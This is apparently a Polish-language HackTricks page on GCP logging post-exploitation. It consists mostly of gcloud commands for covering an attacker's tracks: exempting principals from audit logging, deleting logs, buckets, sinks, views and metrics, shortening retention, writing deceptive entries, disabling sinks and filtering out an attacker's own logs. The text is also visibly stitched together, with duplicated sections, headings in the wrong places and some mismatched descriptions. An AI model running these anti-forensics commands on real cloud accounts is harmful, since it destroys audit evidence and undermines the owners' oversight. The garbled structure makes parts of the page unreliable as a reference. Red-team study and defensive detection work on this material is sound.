# GCP - Logging Post Exploitation

{% hint style="success" %}
Ucz się i ćwicz AWS Hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Ucz się i ćwicz GCP Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Wspieraj HackTricks</summary>

* Sprawdź [**plany subskrypcji**](https://github.com/sponsors/carlospolop)!
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegram**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Dziel się trikami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytoriów na githubie.

</details>
{% endhint %}

## Podstawowe Informacje

Więcej informacji znajdziesz tutaj:

{% content-ref url="../gcp-services/gcp-logging-enum.md" %}
[gcp-logging-enum.md](../gcp-services/gcp-logging-enum.md)
{% endcontent-ref %}

Inne sposoby na zakłócanie monitoringu znajdziesz tutaj:

{% content-ref url="gcp-monitoring-post-exploitation.md" %}
[gcp-monitoring-post-exploitation.md](gcp-monitoring-post-exploitation.md)
{% endcontent-ref %}

### Domyślne Logowanie

**Domyślnie nie zostaniesz złapany tylko za wykonywanie akcji odczytu. Więcej informacji znajdziesz w sekcji Logging Enum.**

### Dodaj Wyjątkowego Principal

W [https://console.cloud.google.com/iam-admin/audit/allservices](https://console.cloud.google.com/iam-admin/audit/allservices) i [https://console.cloud.google.com/iam-admin/audit](https://console.cloud.google.com/iam-admin/audit) można dodać principals, aby nie generować logów. Atakujący może to wykorzystać, aby uniknąć wykrycia.

### Odczyt logów - `logging.logEntries.list`

{% code overflow="wrap" %}
```bash
# Read logs
gcloud logging read "logName=projects/your-project-id/logs/log-id" --limit=10 --format=json

# Everything from a timestamp
gcloud logging read "timestamp >= \"2023-01-01T00:00:00Z\"" --limit=10 --format=json

# Use these options to indicate a different bucket or view to use: --bucket=_Required  --view=_Default
```
{% endcode %}

### `logging.logs.delete`

{% code overflow="wrap" %}
```bash
# Delete all entries from a log in the _Default log bucket - logging.logs.delete
gcloud logging logs delete <log-name>
```
{% endcode %}

### Zapisywanie logów - `logging.logEntries.create`

{% code overflow="wrap" %}
```bash
# Write a log entry to try to disrupt some system
gcloud logging write LOG_NAME "A deceptive log entry" --severity=ERROR
```
{% endcode %}

### `logging.buckets.update`

{% code overflow="wrap" %}
```bash
# Set retention period to 1 day (_Required has a fixed one of 400days)

gcloud logging buckets update bucketlog --location=<location> --description="New description" --retention-days=1
```
{% endcode %}

### `logging.buckets.delete`

### Opis

To uprawnienie pozwala na usunięcie całego zasobnika dzienników. Usunięcie zasobnika dzienników może być użyteczne w celu ukrycia śladów po przeprowadzeniu działań post-exploitation.

### Wykorzystanie

Aby usunąć zasobnik dzienników, użyj poniższego polecenia:

```bash
gcloud logging buckets delete [BUCKET_NAME] --location=[LOCATION]
```

### Przykład

```bash
gcloud logging buckets delete my-logs-bucket --location=global
```

### `logging.sinks.delete`

### Opis

To uprawnienie pozwala na usunięcie sinka dzienników. Usunięcie sinka dzienników może być użyteczne w celu przerwania przepływu dzienników do określonego miejsca docelowego.

### Wykorzystanie

Aby usunąć sink dzienników, użyj poniższego polecenia:

```bash
gcloud logging sinks delete [SINK_NAME]
```

### Przykład

```bash
gcloud logging sinks delete my-logs-sink
```

### `logging.logs.delete`

### Opis

To uprawnienie pozwala na usunięcie określonych dzienników. Usunięcie dzienników może być użyteczne w celu ukrycia śladów po przeprowadzeniu działań post-exploitation.

### Wykorzystanie

Aby usunąć dzienniki, użyj poniższego polecenia:

```bash
gcloud logging logs delete [LOG_NAME]
```

### Przykład

```bash
gcloud logging logs delete my-log
```
```bash
# Delete log bucket
gcloud logging buckets delete BUCKET_NAME --location=<location>
```
### `logging.links.delete`

{% code overflow="wrap" %}
```bash
# Delete link
gcloud logging links delete <link-id> --bucket <bucket> --location <location>
```
{% endcode %}

### `logging.views.delete`

### Opis

To uprawnienie pozwala na usunięcie widoków dzienników w GCP. Widoki dzienników są używane do filtrowania i wyświetlania określonych danych dziennika. Usunięcie widoku dziennika może być użyteczne w celu ukrycia śladów po przeprowadzonych działaniach.

### Wykorzystanie

Aby wykorzystać to uprawnienie, można użyć narzędzia `gcloud`:

```bash
gcloud logging views delete VIEW_NAME --bucket=BUCKET_NAME --location=LOCATION
```

Zastąp `VIEW_NAME` nazwą widoku, który chcesz usunąć, `BUCKET_NAME` nazwą kubełka dzienników, a `LOCATION` lokalizacją kubełka.

### Przykład

Poniżej znajduje się przykład usunięcia widoku dziennika o nazwie `example-view` z kubełka `example-bucket` w lokalizacji `global`:

```bash
gcloud logging views delete example-view --bucket=example-bucket --location=global
```

### Skutki

Usunięcie widoku dziennika nie usuwa samych danych dziennika, ale może utrudnić ich przeglądanie i analizę.
```bash
# Delete a logging view to remove access to anyone using it
gcloud logging views delete <view-id> --bucket=<bucket> --location=global
```
### `logging.views.update`

{% code overflow="wrap" %}
```bash
# Update a logging view to hide data
gcloud logging views update <view-id> --log-filter="resource.type=gce_instance" --bucket=<bucket> --location=global --description="New description for the log view"
```
{% endcode %}

### `logging.logMetrics.update`

{% code overflow="wrap" %}
```bash
# Update log based metrics - logging.logMetrics.update
gcloud logging metrics update <metric-name> --description="Changed metric description" --log-filter="severity>CRITICAL" --project=PROJECT_ID
```
{% endcode %}

### `logging.logMetrics.delete`

### Usuwanie metryk dzienników

Podczas pentestingu w GCP, usuwanie metryk dzienników może być przydatne, aby ukryć swoje ślady. Metryki dzienników mogą być używane do monitorowania aktywności w projekcie, więc ich usunięcie może pomóc w uniknięciu wykrycia.

#### Uprawnienia wymagane do usunięcia metryk dzienników

Aby usunąć metryki dzienników, potrzebujesz uprawnień `logging.logMetrics.delete`. Upewnij się, że masz te uprawnienia przed próbą usunięcia metryk.

#### Jak usunąć metryki dzienników

Możesz użyć poniższego polecenia, aby usunąć metryki dzienników:

```bash
gcloud logging metrics delete METRIC_NAME
```

Zastąp `METRIC_NAME` nazwą metryki, którą chcesz usunąć.

### `logging.sinks.delete`

### Usuwanie sinków dzienników

Sinki dzienników są używane do eksportowania dzienników do różnych miejsc docelowych, takich jak Cloud Storage, BigQuery, czy Pub/Sub. Usunięcie sinków dzienników może być przydatne, aby zatrzymać eksportowanie dzienników i ukryć swoje działania.

#### Uprawnienia wymagane do usunięcia sinków dzienników

Aby usunąć sinki dzienników, potrzebujesz uprawnień `logging.sinks.delete`. Upewnij się, że masz te uprawnienia przed próbą usunięcia sinków.

#### Jak usunąć sinki dzienników

Możesz użyć poniższego polecenia, aby usunąć sinki dzienników:

```bash
gcloud logging sinks delete SINK_NAME
```

Zastąp `SINK_NAME` nazwą sinka, który chcesz usunąć.
```bash
# Delete log based metrics - logging.logMetrics.delete
gcloud logging metrics delete <metric-name>
```
### `logging.sinks.delete`

Usunięcie dzienników może być przydatne, aby ukryć swoje ślady. Możesz usunąć dzienniki, które mogą zawierać dowody twojej obecności lub działań.

### `logging.sinks.update`

Aktualizacja dzienników może być użyteczna, aby zmienić konfigurację dzienników i przekierować je do innego miejsca, co może pomóc w ukryciu twojej aktywności.

### `logging.sinks.create`

Tworzenie nowych dzienników może być użyteczne, aby przechwycić i przechowywać informacje, które mogą być przydatne do dalszej analizy lub eksfiltracji danych.
```bash
# Delete sink - logging.sinks.delete
gcloud logging sinks delete <sink-name>
```
### `logging.sinks.update`

{% code overflow="wrap" %}
```bash
# Disable sink - logging.sinks.update
gcloud logging sinks update <sink-name> --disabled

# Createa filter to exclude attackers logs - logging.sinks.update
gcloud logging sinks update SINK_NAME --add-exclusion="name=exclude-info-logs,filter=severity<INFO"

# Change where the sink is storing the data - logging.sinks.update
gcloud logging sinks update <sink-name> new-destination

# Change the service account to one withuot permissions to write in the destination - logging.sinks.update
gcloud logging sinks update SINK_NAME --custom-writer-identity=attacker-service-account-email --project=PROJECT_ID

# Remove explusions to try to overload with logs - logging.sinks.update
gcloud logging sinks update SINK_NAME --clear-exclusions

# If the sink exports to BigQuery, an attacker might enable or disable the use of partitioned tables, potentially leading to inefficient querying and higher costs. - logging.sinks.update
gcloud logging sinks update SINK_NAME --use-partitioned-tables
gcloud logging sinks update SINK_NAME --no-use-partitioned-tables
```
{% endcode %}

{% hint style="success" %}
Ucz się i ćwicz AWS Hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Ucz się i ćwicz GCP Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Wspieraj HackTricks</summary>

* Sprawdź [**plany subskrypcji**](https://github.com/sponsors/carlospolop)!
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegram**](https://t.me/peass) albo **śledź** nas na **Twitterze** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Dziel się trikami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytoriów na githubie.

</details>
{% endhint %}
